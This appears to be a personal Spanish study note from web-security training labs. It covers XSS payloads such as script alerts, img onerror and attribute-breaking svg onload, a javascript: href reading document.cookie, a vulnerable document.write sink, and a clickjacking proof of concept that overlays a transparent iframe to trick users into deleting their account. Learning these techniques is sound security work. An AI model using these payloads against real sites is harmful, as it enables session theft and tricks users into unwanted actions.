#cybersecurity #code #CTF #linux #vulnerabilities 
## Cross Site Scripting (XSS)

- Básico
```js
<script> alert("XSS") </script> // Despliega una alerta
<script> print() </script>  
<script> console.log("XSS") </script> 
```

Además, existen otras vulnerabilidades al no sanitizar el input

-  **Ejemplo 1**
```js

// Código
<span id="searchMessage"> input_insertado </span> 

// PoC
<span id="searchMessage"> 
	<img src=1 onerror=alert(1)> // Este fue el input
</span> 



// Ejemplo 2
// Código 
<img src=>

// PoC
"><svg onload=alert(1)>             "// Similar a inyección SQL. Vulnerabilidadd al poner el input directo sin sanitizar
```

**Ejemplo 2**
```js
// Codigo 
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>

// PoC    --> input: "><svg onload=alert(1)> 
<img src="/resources/images/tracker.gif?searchTerms=">
<svg onload=alert(1)> // Aca manda la alerta
">
```

O bien, podemos modificar las llamadas a recursos en `href=`
```js
href="javascript:alert(document.cookie)"  
```

## Cross-site request forgery (CSRF)

no me gusta CSRF
## Clickjacking

- **Ejemplo:** Se manipulan los estilos de tal modo que la página original se opaque y se engañe al usuario para cliquear (en este caso, a borrar su cuenta).
```js
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a2200e204e525b180ca1c410043009a.web-security-academy.net/my-account"></iframe>
```